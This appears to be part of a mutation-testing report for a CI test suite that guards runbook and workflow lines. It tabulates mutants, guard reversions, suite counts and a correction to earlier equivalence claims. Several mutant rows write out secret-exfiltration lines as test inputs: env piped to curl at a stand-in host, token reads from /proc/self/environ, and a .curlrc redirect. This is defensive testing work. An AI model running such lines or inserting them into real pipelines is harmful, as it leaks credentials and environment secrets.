### Document mutants (on the real path of a copy)

| Ledger | Mutant | Fixed suite | Named red |
|---|---|---|---|
| V3 | verify line 4: `env \| curl --data-binary @- https://collector.invalid/;` before the construct | 282/284 | N3 `[rb_cmdline_ok ... 106443278]` |
| V3 | verify line 4: `; printenv \| curl -d @- https://collector.invalid/` after jq | 282/284 | N3 `rb_cmdline_ok` |
| V3 | verify line 4: `curl -sS --oauth2-bearer "$(printenv HCLOUD_TOKEN_R""EADONLY)" ...;` before the construct | 282/284 | N3 `rb_cmdline_ok` |
| V3 | verify line 4: the token read from `/proc/self/environ` into a second curl's header | 282/284 | N3 `rb_cmdline_ok` |
| V3 | verify line 4: a `.curlrc` with `connect-to` written and `CURL_HOME` exported before the construct | 282/284 | N3 `rb_cmdline_ok` |
| V3 | read-back line: `curl --noproxy "*"` (no `--disable`) | 282/284 | N3 `rb_cmdline_ok` |
| V3 | verify line 4: `curl --disable` (no `--noproxy`) | 282/284 | N3 `rb_cmdline_ok` |
| V3 | verify line 4: test-design's double-quoted `sh -c "..." && printf ... \| curl ...` line | 282/284 | N3 `rb_cmdline_ok` |
| V3 | an extra `env \| curl ...` line inside the verify block | 283/284 | N3 `rb_cmdline_ok` |
| V5 | ADR addendum: "In practice Guard B4 in `apps/web-platform/infra/workspaces-luks.test.sh` is the web-1 forcing function." | 283/284 | N4 `adr: a sentence pairs B4 with "forcing function"` |
| V5 | ADR addendum `after it 5 (ACTION REQUIRED)` -> `after it 0 (PASS)` | 282/284 | N4 `adr: lacks "after it 5 (ACTION REQUIRED)"` |
| V5 | ADR addendum `job succeeded and emitted` -> `job ran, or emitted` | 282/284 | N4 `adr: lacks "succeeded and emitted"` |

The second red in the runbook and ADR rows is H15's or H17's own copies (`did-not-land`), as above.

### Suite mutants (a guard clause reverted or deleted)

| Ledger | Guard | Mutant | Result | Named red |
|---|---|---|---|---|
| V1 | step env value pin | the `senv[k] != STEP_ENV[key][k]` test made `False` | 280/284 | S2 `v1 the probe's declaration path keyed on the real repository name`, `... behind a ! ...`, `v1 the probe's resource keyed on the fixture run id`, `v1 the commit-time read's path ...` ("not flagged") |
| V1 | workflow env value pin | the `wenv[k] != WF_ENV[k]` test made `False` | 283/284 | S2 `v1 a workflow env value changed` |
| V2 | exact checkout SHA | back to `re.fullmatch(r"actions/checkout@[0-9a-f]{40}", ...)` | 283/284 | S2 `v2 the checkout on another 40-hex SHA` |
| V3 | exact-text pin | rb_cmdline_ok back to round 2's closed grammar (its stdin construct widened to the confined curl, so the real lines pass) | 283/284 | H15 `vb-env-piped-out-before vb-printenv-piped-out-after-jq vb-spliced-name-second-curl vb-proc-environ vb-curlrc-redirect vb-extra-line-in-the-block` |
| V4 | probe-line verdict equality | the comparison made `true` | 283/284 (after the fix below) | H5 `_iv_forgedprobe` |
| V4 | gate-line verdict equality | the comparison made `true` | 283/284 | H5 `_iv_forgedgate` |
| V5 | N4 | back to round 2's n4 (`[^.]*` pairing, no exit or leg requirement, `Re-evaluate by` only) | 283/284 | H17 `adr-b4-pairing-across-a-dotted-path adr-exit-0-past-the-date job-exit-0-past-the-date adr-leg-ran-not-succeeded job-re-evaluate-on` |
| V6 | `not jt > sum(bounds)` | deleted | 284/284 rc 0 | none: the declared EQUIVALENT mutant (suite header) |

**A gap my first battery found.** The probe-line equality deletion first SURVIVED (284/284 rc 0): `_iv_forgedverdict`
forges both lines, so the gate equality alone also flags it, and no H5 control isolated the probe line. The row
`_iv_forgedprobe` (the probe line forged, the gate line true) was added; the deletion then reds H5 `_iv_forgedprobe`
(283/284), and the control stays 284/284. The workflow mutant `w-v4-probe-echo` was red both before and after (V4, T2,
WV4 name the probe line).

**V3, the edited lines run.** All five 6604 lines were run against a stub `doppler` (it injects only
`HCLOUD_TOKEN_READONLY`, from the stub's environment) and a stub `curl` (it records argv and stdin). With no token, each
prints `missing-token` with rc 3 and makes no request. With a token, each makes one request whose argv starts
`--disable --noproxy * -sS --config - --max-time 30`, whose stdin is `header = "Authorization: Bearer <token>"`, and whose
argv never holds the token. The outputs are `404`, `[106443278]`, `[]`, `true` and `protected`, each rc 0. The real
curl 8.23.0 was also checked: a `.curlrc` under `CURL_HOME` with a `write-out` line is applied without `--disable` and
ignored with it, and `http_proxy` is not used with `--noproxy "*"`.

**Correction (append-only; the rows above it stay).** Two EQUIVALENT claims in the "Review round 2" section are false, as
the test-design seat showed on ac827785dc. (1) "exact-wrapper prefix: EQUIVALENT to the tail check". It is false on a
line that opens with a double-quoted `sh -c "..."` and runs printf and curl outside Doppler. That line passed every other
clause. (2) The suite-header claim that N1c's read-back equality is EQUIVALENT to its file-wide id set `_f`. It is false
on a read-back written in the 404 form, which `_f` leaves out. Both claims are removed from the suite header. The first
no longer applies, since rb_line_ok is gone (V3). The N1c equality stays as a load-bearing clause. The "no other channel
... can read it" comment is replaced by what the exact-text pin guarantees and what it does not.

Final counts: FLOOR 284 (was 278: six S2 rows, five V1 and one V2; H5, H15 and H17 stay single assertions), TABLE_ROWS 149
(unchanged).
